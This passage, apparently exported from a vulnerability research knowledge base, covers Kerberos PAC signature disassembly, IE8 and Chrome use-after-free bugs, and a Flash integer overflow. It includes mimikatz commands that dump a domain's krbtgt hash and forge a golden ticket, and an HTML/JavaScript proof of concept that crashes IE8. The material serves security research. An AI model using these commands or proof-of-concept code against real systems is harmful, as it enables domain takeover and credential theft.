eax,dword ptr [ebp-48h]\n63a91d97 ff7004          push    dword ptr [eax+4]\n63a91d9a ff75b4          push    dword ptr [ebp-4Ch]\n63a91d9d ff5010          call    dword ptr [eax+10h]\n63a91da0 8d45d4          lea     eax,[ebp-2Ch]\n63a91da3 50              push    eax\n63a91da4 ff75b4          push    dword ptr [ebp-4Ch]\n63a91da7 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a91daa ff5014          call    dword ptr [eax+14h]\n63a91dad 8d45b4          lea     eax,[ebp-4Ch]\n63a91db0 50              push    eax\n63a91db1 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a91db4 ff5018          call    dword ptr [eax+18h]\n63a91db7 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a91dba 8b4804          mov     ecx,dword ptr [eax+4]\n63a91dbd 8b459c          mov     eax,dword ptr [ebp-64h]\n63a91dc0 8b4004          mov     eax,dword ptr [eax+4]\n63a91dc3 83e804          sub     eax,4\n63a91dc6 3bc8            cmp     ecx,eax\n63a91dc8 7510            jne     KDCSVC!KdcVerifyPacSignature+0x2b3 (63a91dda)\n\nKDCSVC!KdcVerifyPacSignature+0x2a7:\n63a91dca 8d7dc0          lea     edi,[ebp-40h]\n63a91dcd 8d75d4          lea     esi,[ebp-2Ch]\n63a91dd0 33c0            xor     eax,eax\n63a91dd2 f3a6            repe cmps byte ptr [esi],byte ptr es:[edi]\n63a91dd4 0f840e74ffff    je      KDCSVC!KdcVerifyPacSignature+0x2ee (63a891e8)\n\nKDCSVC!KdcVerifyPacSignature+0x2b3:\n63a91dda 687c1ea963      push    offset KDCSVC!`string' (63a91e7c)\n\nKDCSVC!KdcVerifyPacSignature+0x2bf:\n63a91ddf 6a01            push    1\n63a91de1 e89d1effff      call    KDCSVC!KDCDebugPrint (63a83c83)\n63a91de6 59              pop     ecx\n63a91de7 59              pop     ecx\n63a91de8 c745bc29000000  mov     dword ptr [ebp-44h],29h\n63a91def eb1f            jmp     KDCSVC!KdcVerifyPacSignature+0x2f4 (63a91e10)\n\nKDCSVC!KdcVerifyPacSignature+0x2d8:\n63a91df1 ff7510          push    dword ptr [ebp+10h]\n63a91df4 ff75b0          push    dword ptr [ebp-50h]\n63a91df7 e85a58ffff      call    KDCSVC!PAC_ReMarshal (63a87656)\n63a91dfc 84c0            test    al,al\n63a91dfe 0f85e473ffff    jne     KDCSVC!KdcVerifyPacSignature+0x2ee (63a891e8)\n\nKDCSVC!KdcVerifyPacSignature+0x2e7:\n63a91e04 c745bc3c000000  mov     dword ptr [ebp-44h],3Ch\n63a91e0b e9d873ffff      jmp     KDCSVC!KdcVerifyPacSignature+0x2ee (63a891e8)\n\nKDCSVC!KdcVerifyPacSignature+0x2f4:\n63a91e10 8b75a8          mov     esi,dword ptr [ebp-58h]\n63a91e13 0fb706          movzx   eax,word ptr [esi]\n63a91e16 40              inc     eax\n63a91e17 40              inc     eax\n63a91e18 50              push    eax\n63a91e19 e84301ffff      call    KDCSVC!MIDL_user_allocate (63a81f61)\n63a91e1e 8bd8            mov     ebx,eax\n63a91e20 85db            test    ebx,ebx\n63a91e22 7416            je      KDCSVC!KdcVerifyPacSignature+0x31e (63a91e3a)\n\nKDCSVC!KdcVerifyPacSignature+0x308:\n63a91e24 0fb70e          movzx   ecx,word ptr [esi]\n63a91e27 8b7604          mov     esi,dword ptr [esi+4]\n63a91e2a 8bc1            mov     eax,ecx\n63a91e2c c1e902          shr     ecx,2\n63a91e2f 8bfb            mov     edi,ebx\n63a91e31 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n63a91e33 8bc8            mov     ecx,eax\n63a91e35 83e103          and     ecx,3\n63a91e38 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]\n\nKDCSVC!KdcVerifyPacSignature+0x31e:\n63a91e3a 53              push    ebx\n63a91e3b 6a01            push    1\n63a91e3d 8d45bc          lea     eax,[ebp-44h]\n63a91e40 50              push    eax\n63a91e41 6a04            push    4\n63a91e43 68120000c0      push    0C0000012h\n63a91e48 6a01            push    1\n63a91e4a e8aa550000      call    KDCSVC!ReportServiceEvent (63a973f9)\n63a91e4f 83c418          add     esp,18h\n63a91e52 85db            test    ebx,ebx\n63a91e54 0f849873ffff    je      KDCSVC!KdcVerifyPacSignature+0x340 (63a891f2)\n\nKDCSVC!KdcVerifyPacSignature+0x33a:\n63a91e5a 53              push    ebx\n63a91e5b e84700ffff      call    KDCSVC!MIDL_user_free (63a81ea7)\n63a91e60 e98d73ffff      jmp     KDCSVC!KdcVerifyPacSignature+0x340 (63a891f2)\n\nKDCSVC!KdcVerifyPacSignature+0x349:\n63a91e65 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a91e68 85c0            test    eax,eax\n63a91e6a 0f848f73ffff    je      KDCSVC!KdcVerifyPacSignature+0x357 (63a891ff)\n\nKDCSVC!KdcVerifyPacSignature+0x350:\n63a91e70 8d4db4          lea     ecx,[ebp-4Ch]\n63a91e73 51              push    ecx\n63a91e74 ff5018          call    dword ptr [eax+18h]\n63a91e77 e98373ffff      jmp     KDCSVC!KdcVerifyPacSignature+0x357 (63a891ff)\n```\n\n[*] Golden attack:\n\n(1) From the AD:\n\n```\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # lsadump::lsa /inject /name:krbtgt\nDomain : SMALLBUSINESS / S-1-5-21-1053798420-2132824579-2427655443\n\nRID  : 000001f6 (502)\nUser : krbtgt\n\n * Primary\n    LM   :\n    NTLM : 6375ac5dba2a03b83002ba6e6e96c547 <-- it is what we need!\n\n * WDigest\n    01  bf816f365e0fac18a06269b62fdec3cd\n    02  60bcd5b31db779bee316ead3f9f2bdc5\n    03  052450bedad3c62b6c7ac2e0518cced6\n    04  bf816f365e0fac18a06269b62fdec3cd\n    05  60bcd5b31db779bee316ead3f9f2bdc5\n    06  6b46611bab1bfc37642831eb4c378a3c\n    07  bf816f365e0fac18a06269b62fdec3cd\n    08  36d36b240d95960b3280c17f3dbdd4ef\n    09  36d36b240d95960b3280c17f3dbdd4ef\n    10  7700dc3feea8de94dfe42fadd189b562\n    11  cf5dd5487a5bf52ddb92114e11b35258\n    12  36d36b240d95960b3280c17f3dbdd4ef\n    13  85c06a5e70ebb4ea9ea94ec741afc3f4\n    14  cf5dd5487a5bf52ddb92114e11b35258\n    15  9e215c82295f151f068a61dcfc25df79\n    16  9e215c82295f151f068a61dcfc25df79\n    17  2bbe05a083dd57a8db17231355da9ef5\n    18  d66e91d4fcd16a0e98c16bec14676e06\n    19  63381fd3a292e6d6c89ced1f6b14e580\n    20  111ef3e25e5237fea3190ae4924c981c\n    21  68c6af34d37db9eeed0e32540f60fe3a\n    22  68c6af34d37db9eeed0e32540f60fe3a\n    23  207d5247bd7dac0b5100035d0d6ffb6d\n    24  5db537f6bfc59059821180dc06e18696\n    25  5db537f6bfc59059821180dc06e18696\n    26  f8247c1ccff30ab886e699e401c98241\n    27  03ddbc3697b4eac454c5c8a5746c4165\n    28  98b8c45c30f3eb9727de422e2ff11429\n    29  72fed805b12f04991c8326e8664f909f\n\n * Kerberos\n    Default Salt : SMALLBUSINESS.LOCALkrbtgt\n    Credentials\n      des_cbc_md5       : 497f68d05db65be0\n      des_cbc_crc       : 497f68d05db65be0\n```\n\n\n6375ac5dba2a03b83002ba6e6e96c547\n\n(2) From the machine we're attacking (user juan):\n\n```\nkerberos::golden /domain:SMALLBUSINESS.local /sid:S-1-5-21-1053798420-2132824579-2427655443 /user:juan /id:1116 /groups:513,500 /krbtgt:6375ac5dba2a03b83002ba6e6e96c547\n```\n\nThat's all.\n\nI think the idea is similar to the golden attac, but hopefully we don't need the\nkrbtgt key anymore. Even when I can modify the SignatureType, and create RC4\nencrypted tickets with different signautres. The key is needed still to encrypt\na ticket.\n\nSo, by modifying mimikatz I can easily create different \"malformed tickets\". Even\nwhen I can switch the signature mekanism I neeed the krbtgt hash to encrypt the\nTGT ticket.\n\n(Hash for DES)\n\n```\nkerberos::golden /domain:SMALLBUSINESS.local /sid:S-1-5-21-1053798420-2132824579-2427655443 /user:juan /id:1116 /groups:513,500 /krbtgt:497f68d05db65be0\n```\n\n* To check the signature used by ValidationInfo I'm using the next breakoint:\n\n```\nbp 63a89167 \"r edx; dd edx L1; kb 4; g\"\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "4664200a-e18d-46c7-ae02-6a5b749ed899",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "64c59e3c-fc65-4ad9-9101-9f697bb01f07",
      "created": "2019-09-12T18:07:03.141253Z",
      "revisionDate": "2020-02-13T17:12:22.042371Z",
      "document": "\n\nPoC does not trigger for the following setups:\n\n* Win XP SP3 + IE7\n* Win 7 SP1 + IE9\n\n# PoC\n\n```\n<!DOCTYPE html>\n<table>\n    <tr>\n        <div>\n            <span>\n                <q id='e'>\n                    <a>\n                        <td></td>\n                    </a>\n                </q>\n            </span>\n        </div>\n    </tr>\n</table>\n\n<script>\nwindow.onload = function(){\nvar x = document.getElementById('e');\nx.outerHTML = '';\n}\n</script>\n</html>\n```\n\n# Current Summary\n\nIn IE8 standards mode, it's possible to cause a use-after-free condition by first creating an\nillogical table tree, where a CPhraseElement comes after CTableRow, with the final node being\na sub table element. When the CPhraseElement's outer content is reset by using either outerText\nor outerHTML through an event handler, this triggers a free of its child element (in this case,\na CAnchorElement, but some other objects apply too), but a reference is still kept in function\nSRunPointer::SpanQualifier. This function will then pass on the invalid reference to the next\nfunctions, eventually used in mshtml!CElement::Doc when it's trying to make a call to the object's\nSecurityContext virtual function at offset +0x70, which results a crash. An attacker can take\nadvantage of this by first creating an CAnchorElement object, let it free, and then replace the\nfreed memory with another fake object. Successfully doing so may allow arbitrary code execution\nunder the context of the user.\n\nThis bug is specific to Internet Explorer 8 only. It was originally discovered by Orange Tsai at\nHitcon 2013, but was silently patched in the July 2013 update (MS13-055).\n\n# DOM Tree\n\n```\nCBodyElement -> CTable -> CTableSection -> CTableRow -> CPhraseElement -> CAnchorElement -> CTableCell\n```\n\n# Win XP SP3 + IE8\n\n```\n.text:63717B12 ; public: class ISpanQualifier * __thiscall SRunPointer::SpanQualifier(void)const\n.text:63717B12 ?SpanQualifier@SRunPointer@@QBEPAVISpanQualifier@@XZ proc near\n...\ntext:63717B2D                 mov     eax, [eax+0Ch]\n```\n\nAnd then this return value is passed on to GetFancyFormat:\n\n```\n.text:6371DBC5                 call    ?SpanQualifier@SRunPointer@@QBEPAVISpanQualifier@@XZ ; SRunPointer::SpanQualifier(void)\n.text:6371DBCA                 call    ?GetFancyFormat@ISpanQualifier@@QAEPBVCFancyFormat@@_N@Z ; ISpanQualifier::GetFancyFormat(bool)\n...\n```\n\nIn GetFancyFormat, that return value is assigned to ESI:\n\n```\n.text:63717F1A                 mov     esi, eax\n.text:63717F1C                 call    ?IsTreeNodeQualifier@ISpanQualifier@@QBE_NXZ ; ISpanQualifier::IsTreeNodeQualifier(void)\n```\n\nESI will then get assigned to ECX - \"this\" in C++:\n\n```\n.text:63717F29                 mov     ecx, esi\n.text:63717F2B                 call    ?GetFancyFormat@CTreeNode@@QAEPBVCFancyFormat@@XZ ; CTreeNode::GetFancyFormat(void)\n```\n\nYou keep following ECX, eventually that leads to the crash.\n\n```\n0:008> dd ebx L30/4\n06a20fb0  06a32f98 00000000 ffff0002 ffffffff\n06a20fc0  00000011 00000000 00000000 00000000\n06a20fd0  00000000 06a20fd8 00000012 00000000\n```\n\nvftable     = 06a32f98\nRef counter = 0\n\n```\n0:008> !heap -p -a ebx\n    address 06a20fb0 found in\n    _DPH_HEAP_ROOT @ 151000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                 653d418:          6a20fb0               4c -          6a20000             2000\n          ? <Unloaded_pi.dll>+6a32f97\n    7c918f01 ntdll!RtlAllocateHeap+0x00000e64\n    636a9a94 mshtml!CHtmRootParseCtx::OverlappedEndElement+0x00000141\n    636a99d3 mshtml!CHtmRootParseCtx::EndElement+0x000000cb\n    635a8ee4 mshtml!CHtmTextParseCtx::EndElement+0x0000006e\n    635a71eb mshtml!CHtmParse::EndElement+0x0000007b\n    6359f47c mshtml!CHtmParse::CloseContainer+0x000001c5\n    635bf441 mshtml!CHtmParse::CloseAllContainers+0x00000026\n    635a941d mshtml!CHtmParse::PrepareContainer+0x0000007f\n    635a933f mshtml!CHtmParse::ParseBeginTag+0x00000028\n    635a6bb6 mshtml!CHtmParse::ParseToken+0x00000082\n    635a7ff4 mshtml!CHtmPost::ProcessTokens+0x00000237\n    635a734c mshtml!CHtmPost::Exec+0x00000221\n    635ac2b8 mshtml!CHtmPost::Run+0x00000015\n    635ac21b mshtml!PostManExecute+0x000001fd\n    635ac17e mshtml!PostManResume+0x000000f8\n    635ac0e2 mshtml!CHtmPost::OnDwnChanCallback+0x00000010\n\n\n\n0:008> !heap -p -a ecx\n    address 06a32f98 found in\n    _DPH_HEAP_ROOT @ 151000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    653d6c0:          6a32000             2000\n    7c927553 ntdll!RtlFreeHeap+0x000000f9\n    637e06f2 mshtml!CAnchorElement::`vector deleting destructor'+0x00000028\n    63628a50 mshtml!CBase::SubRelease+0x00000022\n    63625df6 mshtml!CElement::PrivateExitTree+0x00000011\n    635c5ef1 mshtml!CMarkup::SpliceTreeInternal+0x00000083\n    635c84e3 mshtml!CDoc::CutCopyMove+0x000000ca\n    635c9264 mshtml!CDoc::Remove+0x00000018\n    635c92e9 mshtml!RemoveWithBreakOnEmpty+0x0000003a\n    63742f86 mshtml!CElement::InjectInternal+0x0000032a\n    635c9415 mshtml!CElement::InjectCompatBSTR+0x00000046\n    638bb56b mshtml!CElement::put_outerText+0x00000025\n    6366906f mshtml!GS_BSTR+0x000001ab\n    636430c9 mshtml!CBase::ContextInvokeEx+0x000005d1\n    6366418a mshtml!CElement::ContextInvokeEx+0x0000009d\n    6362b6ce mshtml!CInput::VersionedInvokeEx+0x0000002d\n    63642eec mshtml!PlainInvokeEx+0x000000ea\n```\n\n```\n.text:635C4A2E ; public: static long __stdcall CAnchorElement::CreateElement(class CHtmTag *, class CDoc *, class CElement * *)\n.text:635C4A2E ?CreateElement@CAnchorElement@@SGJPAVCHtmTag@@PAVCDoc@@PAPAVCElement@@@Z proc near\n.text:635C4A2E                                         ; DATA XREF: .text:6364B798\u0019o\n.text:635C4A2E\n.text:635C4A2E arg_4           = dword ptr  0Ch\n.text:635C4A2E arg_8           = dword ptr  10h\n.text:635C4A2E\n.text:635C4A2E ; FUNCTION CHUNK AT .text:638589CC SIZE 0000000A BYTES\n.text:635C4A2E\n.text:635C4A2E                 mov     edi, edi\n.text:635C4A30                 push    ebp\n.text:635C4A31                 mov     ebp, esp\n.text:635C4A33                 push    esi\n.text:635C4A34                 push    edi\n.text:635C4A35                 push    68h             ; dwBytes\n.text:635C4A37                 push    8               ; dwFlags\n.text:635C4A39                 push    _g_hProcessHeap ; hHeap\n.text:635C4A3F                 xor     edi, edi\n.text:635C4A41                 call    ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)\n```\n\n```\n0:008> r\neax=63aae200 ebx=06a20fb0 ecx=06a32f98 edx=00000000 esi=037cd1e0 edi=00000000\neip=6363fcc4 esp=037cd1b4 ebp=037cd1cc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc:\n6363fcc4 8b01            mov     eax,dword ptr [ecx]  ds:0023:06a32f98=????????\n\n0:008> dds 63630788+0x70 L1\n636307f8  6363fc94 mshtml!CElement::SecurityContext\n\n0:008> k\nChildEBP RetAddr\n037cd1b0 63602718 mshtml!CElement::Doc\n037cd1cc 636026a3 mshtml!CTreeNode::ComputeFormats+0xb9\n037cd478 63612a85 mshtml!CTreeNode::ComputeFormatsHelper+0x44\n037cd488 63612a45 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11\n037cd498 63612a2c mshtml!CTreeNode::GetFancyFormatHelper+0xf\n037cd4a8 63717f30 mshtml!CTreeNode::GetFancyFormat+0x35\n037cd4b4 6371dbcf mshtml!ISpanQualifier::GetFancyFormat+0x5a\n037cd4c0 6371db8f mshtml!SRunPointer::IsRelativeSpanEdge+0x3a\n037cd4c8 637224a7 mshtml!SRunPointer::IsRelativeSpan+0x14\n037cd4e8 63722412 mshtml!CDisplayBoxProperties::GetHasInlineOutlines+0x7d\n037cd518 63723ccf mshtml!CDisplayBoxProperties::SetDisplayBoxProperties+0x24d\n037cd89c 63723c13 mshtml!CPtsTextParaclient::SetupTextDisplayBox+0x90\n037cd924 63723b48 mshtml!CPtsTextParaclient::SetupDisplayBoxForSpan+0x66\n037cda10 6370e989 mshtml!CPtsTextParaclient::SetupDisplayBox+0x203\n037cdac8 6370e73e mshtml!CPtsBfcBlockParaclient::SetupDisplayBoxForTrack+0x2b7\n037cde48 636ccc93 mshtml!CPtsBfcBlockParaclient::SetupDisplayBox+0x349\n037cdeec 636cca21 mshtml!CPtsTableContainerParaclient::SetupDisplayBoxForTrack+0x130\n037ce408 6370c515 mshtml!CPtsTableContainerParaclient::SetupDisplayBox+0x2ad\n037ce888 6370c515 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a6\n037ced08 6370e989 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a6\n```\n\n# Win 7 SP0 + IE8\n\n```\nMicrosoft (R) Windows Debugger Version 6.11.0001.404 X86\nCopyright (c) Microsoft Corporation. All rights reserved.\n....\n0:012> g\n....\n(c20.274): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=6b105100 ebx=08a7ffb0 ecx=08f0ff98 edx=00000000 esi=043fcf78 edi=00000000\neip=6ad8c400 esp=043fcf4c ebp=043fcf64 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc:\n6ad8c400 8b01            mov     eax,dword ptr [ecx]  ds:0023:08f0ff98=????????\n0:005> u\nmshtml!CElement::Doc:\n6ad8c400 8b01            mov     eax,dword ptr [ecx]\n6ad8c402 8b5070          mov     edx,dword ptr [eax+70h]\n6ad8c405 ffd2            call    edx\n6ad8c407 8b400c          mov     eax,dword ptr [eax+0Ch]\n6ad8c40a c3              ret\n6ad8c40b 33c0            xor     eax,eax\n6ad8c40d e9f7aeffff      jmp     mshtml!CAttrArray::PrivateFind+0x8f (6ad87309)\n6ad8c412 90              nop\n0:005> k\nChildEBP RetAddr\n043fcf48 6adb5961 mshtml!CElement::Doc\n043fcf64 6adb586d mshtml!CTreeNode::ComputeFormats+0xba\n043fd210 6adba12d mshtml!CTreeNode::ComputeFormatsHelper+0x44\n043fd220 6adba0ed mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11\n043fd230 6adba0d4 mshtml!CTreeNode::GetFancyFormatHelper+0xf\n043fd240 6ac3b9c4 mshtml!CTreeNode::GetFancyFormat+0x35\n043fd24c 6acb15b0 mshtml!ISpanQualifier::GetFancyFormat+0x5a\n043fd258 6acb156d mshtml!SRunPointer::IsRelativeSpanEdge+0x3a\n043fd260 6acb4c92 mshtml!SRunPointer::IsRelativeSpan+0x14\n043fd290 6acb4bfd mshtml!CDisplayBoxProperties::GetHasInlineOutlines+0x7d\n043fd2c0 6acb532e mshtml!CDisplayBoxProperties::SetDisplayBoxProperties+0x24c\n043fd644 6acb5272 mshtml!CPtsTextParaclient::SetupTextDisplayBox+0x90\n043fd6d4 6acb51a7 mshtml!CPtsTextParaclient::SetupDisplayBoxForSpan+0x66\n043fd7c0 6ac9e4a9 mshtml!CPtsTextParaclient::SetupDisplayBox+0x203\n043fd878 6ac9e271 mshtml!CPtsBfcBlockParaclient::SetupDisplayBoxForTrack+0x2b7\n043fdbf8 6ac57a79 mshtml!CPtsBfcBlockParaclient::SetupDisplayBox+0x352\n043fdc9c 6ac57834 mshtml!CPtsTableContainerParaclient::SetupDisplayBoxForTrack+0x133\n043fe1b8 6ac9d919 mshtml!CPtsTableContainerParaclient::SetupDisplayBox+0x2ad\n043fe638 6ac9d919 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a9\n043feab8 6ac9e4a9 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a9\n0:005> !heap -p -a ebx\n    address 08a7ffb0 found in\n    _DPH_HEAP_ROOT @ 51000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                 83d3e04:          8a7ffb0               4c -          8a7f000             2000\n    6d4f8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229\n    77594ea6 ntdll!RtlDebugAllocateHeap+0x00000030\n    77557d96 ntdll!RtlpAllocateHeap+0x000000c4\n    775234ca ntdll!RtlAllocateHeap+0x0000023a\n    6ac2565b mshtml!CHtmRootParseCtx::OverlappedEndElement+0x00000141\n    6ac2557e mshtml!CHtmRootParseCtx::EndElement+0x000000cb\n    6ad17870 mshtml!CHtmTextParseCtx::EndElement+0x0000006e\n    6ad170b8 mshtml!CHtmParse::EndElement+0x0000007b\n    6ad2a4de mshtml!CHtmParse::CloseContainer+0x000001c1\n    6ad292d3 mshtml!CHtmParse::CloseAllContainers+0x00000026\n    6ad18864 mshtml!CHtmParse::PrepareContainer+0x0000007f\n    6ad18907 mshtml!CHtmParse::ParseBeginTag+0x00000028\n    6ad16e93 mshtml!CHtmParse::ParseToken+0x00000082\n    6ad175c9 mshtml!CHtmPost::ProcessTokens+0x00000237\n    6ad078e8 mshtml!CHtmPost::Exec+0x00000221\n    6ad08a99 mshtml!CHtmPost::Run+0x00000015\n    6ad089fd mshtml!PostManExecute+0x000001fb\n    6ad07c66 mshtml!PostManResume+0x000000f7\n    6ad213f6 mshtml!CHtmPost::OnDwnChanCallback+0x00000010\n    6ad053fc mshtml!CDwnChan::OnMethodCall+0x00000019\n    6ada94b2 mshtml!GlobalWndOnMethodCall+0x000000ff\n    6ad937f7 mshtml!GlobalWndProc+0x0000010c\n    75bc86ef USER32!InternalCallWinProc+0x00000023\n    75bc8876 USER32!UserCallWinProcCheckWow+0x0000014b\n    75bc89b5 USER32!DispatchMessageWorker+0x0000035e\n    75bc8e9c USER32!DispatchMessageW+0x0000000f\n    6d8004a6 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000452\n    6d810446 IEFRAME!LCIETab_ThreadProc+0x000002c1\n    763849bd iertutil!CIsoScope::RegisterThread+0x000000ab\n    75f71174 kernel32!BaseThreadInitThunk+0x0000000e\n    7752b3f5 ntdll!__RtlUserThreadStart+0x00000070\n    7752b3c8 ntdll!_RtlUserThreadStart+0x0000001b\n\n\n0:005> !heap -p -a ecx\n    address 08f0ff98 found in\n    _DPH_HEAP_ROOT @ 51000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    8f50138:          8f0f000             2000\n    6d4f90b2 verifier!AVrfDebugPageHeapFree+0x000000c2\n    77595674 ntdll!RtlDebugFreeHeap+0x0000002f\n    77557aca ntdll!RtlpFreeHeap+0x0000005d\n    77522d68 ntdll!RtlFreeHeap+0x00000142\n    75f6f1ac kernel32!HeapFree+0x00000014\n    6adf8c42 mshtml!CAnchorElement::`vector deleting destructor'+0x00000028\n    6ad97dd0 mshtml!CBase::SubRelease+0x00000022\n    6adf0fdf mshtml!CElement::PrivateExitTree+0x00000011\n    6acd5b42 mshtml!CMarkup::SpliceTreeInternal+0x00000083\n    6acd6ff9 mshtml!CDoc::CutCopyMove+0x000000ca\n    6acd6f39 mshtml!CDoc::Remove+0x00000018\n    6acd6f17 mshtml!RemoveWithBreakOnEmpty+0x0000003a\n    6ac0288a mshtml!CElement::InjectInternal+0x0000032a\n    6acd704a mshtml!CElement::InjectCompatBSTR+0x00000046\n    6af1aee9 mshtml!CElement::put_outerText+0x00000025\n    6ae172d6 mshtml!GS_BSTR+0x000001ac\n    6ae0235c mshtml!CBase::ContextInvokeEx+0x000005dc\n    6ae0c75a mshtml!CElement::ContextInvokeEx+0x0000009d\n    6ae0c79a mshtml!CInput::VersionedInvokeEx+0x0000002d\n    6adb3104 mshtml!PlainInvokeEx+0x000000eb\n    6cdea22a jscript!IDispatchExInvokeEx2+0x00000104\n    6cdea175 jscript!IDispatchExInvokeEx+0x0000006a\n    6cdea3f6 jscript!InvokeDispatchEx+0x00000098\n    6cdea4a0 jscript!VAR::InvokeByName+0x00000139\n    6cdfd8c8 jscript!VAR::InvokeDispName+0x0000007d\n    6cde9c0e jscript!CScriptRuntime::Run+0x0000208d\n    6cdf5c9d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce\n    6cdf5bfb jscript!ScrFncObj::Call+0x0000008d\n    6cdf5e11 jscript!CSession::Execute+0x0000015f\n    6cdef3ee jscript!NameTbl::InvokeDef+0x000001b5\n    6cdeea2e jscript!NameTbl::InvokeEx+0x0000012c\n    6ae27af1 mshtml!CBase::InvokeDispatchWithThis+0x000001e1\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "863e3f61-cbf6-44c1-aea8-ee28210bee64",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "b8e7482a-6479-48ad-b973-1e03e92a01a6",
      "created": "2019-09-12T18:07:04.091118Z",
      "revisionDate": "2020-02-13T17:12:21.762236Z",
      "document": "\n\n## Details\n\nThe decode_buffer_size is calculated this way in Flash:\n\n```c\ndecode_buffer_size = (encode_data_size \u2013 1) * 6 + 2\n```\n\nIn asm:\n\n```\n.text:10024F13 loc_10024F13:                           ; CODE XREF: sub_10024C79+278j\n.text:10024F13                 mov     eax, ebx\n.text:10024F15                 imul    eax, 6\n.text:10024F18                 add     eax, 2\n.text:10024F1B                 cmp     [esi+28h], eax\n.text:10024F1E                 mov     [ebp+var_20], eax\n.text:10024F21                 jge     short loc_10024F4D\n```\n\nDuring decoding, the buffer can be reallocated:\n\n```c\nint current_buffer_size\n\nint decoded_buffer_size\n\nif (current_buffer_size  < decoded_buffer_size) {\n\n// reallocate the decode buffer\n\n}\n```\n\nIf the encode_data_size is larger than 0x2aaaaaab, it will cause an integer overflow in the\ncalculation of ```(encode_data_size \u20131) * 6 + 2```\n\n## Patch for CVE-2015-5560\n\nVersion 18.0.0.232:\n\n```\n.text:10024E3E                 mov     eax, [ebp+var_14]\n.text:10024E41                 imul    eax, 6\n.text:10024E44                 inc     eax\n.text:10024E45                 inc     eax\n.text:10024E46                 cmp     eax, [ebp+var_14]\n.text:10024E49                 jbe     loc_10024FB8\n```\n\n```\n(encode_data_size * 6 + 2) >  encode_data_size\n```\n\nNote that it seems this patch can be bypassed, see CVE-2015-8446\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "6eb1d6b2-17b8-4ed0-af43-755ef4323797",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "46ae5a4f-8bf9-4cf9-bb33-2cb591d7b62d",
      "created": "2019-09-12T18:07:05.11847Z",
      "revisionDate": "2020-11-22T02:39:47.408238Z",
      "document": " a/third_party/blink/renderer/core/fileapi/file_reader_loader.cc\n+++ b/third_party/blink/renderer/core/fileapi/file_reader_loader.cc\n@@ -143,14 +143,16 @@ DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() {\n   if (!raw_data_ || error_code_ != FileErrorCode::kOK)\n     return nullptr;\n\n-  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());\n-  if (finished_loading_) {\n-    array_buffer_result_ = result;\n-    AdjustReportedMemoryUsageToV8(\n-        -1 * static_cast<int64_t>(raw_data_->ByteLength()));\n-    raw_data_.reset();\n+  if (!finished_loading_) {\n+    return DOMArrayBuffer::Create(\n+        ArrayBuffer::Create(raw_data_->Data(), raw_data_->ByteLength()));\n   }\n-  return result;\n+\n+  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());\n+  AdjustReportedMemoryUsageToV8(-1 *\n+                                static_cast<int64_t>(raw_data_->ByteLength()));\n+  raw_data_.reset();\n+  return array_buffer_result_;\n }\n\n String FileReaderLoader::StringResult() {\n```\n\n#### Clue 1: readAsArrayBuffer\n\nThis patch provides a lot of insight about the user-after-free. The first thing that stands out is the patched method named `FileReaderLoader::ArrayBufferResult`, which clearly indicates the use of `readAsArrayBuffer` in the exploit.\n\n#### Clue 2: The finished_loading_ condition\n\nA major difference between patched vs unpatched is the `finished_loading_` check, which is a flag that is set when body is finished loading. In the vulnerable version, our method is always doing the following:\n\n```cpp\nDOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());\n```\n\nIn the patched version, it is doing:\n\n```cpp\n  if (!finished_loading_) {\n    return DOMArrayBuffer::Create(\n        ArrayBuffer::Create(raw_data_->Data(), raw_data_->ByteLength()));\n  }\n\n  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_->ToArrayBuffer());\n```\n\nThe difference is that if loading isn't finished, it will make sure to create a new `ArrayBuffer` (which increments the reference counter), instead of obtaining ownership of `ArrayBuffer`, and passing to `MakeGarbageCollected`:\n\n```cpp\nstatic DOMArrayBuffer* Create(scoped_refptr<WTF::ArrayBuffer> buffer) {\n  return MakeGarbageCollected<DOMArrayBuffer>(std::move(buffer));\n}\n```\n\nNote: The `ToArrayBuffer` method always return the actual state of the ArrayBuffer asynchronously.\n\n#### Clue 3: The Arbitrary free\n\nAnother clue comes from the comment in the commit, stating:\n\n> \u2026 multiple references to the same underlying ArrayBuffer.\n\nThis is rather hard to get, but Istvan Kurucsai from Exodus Intel found a 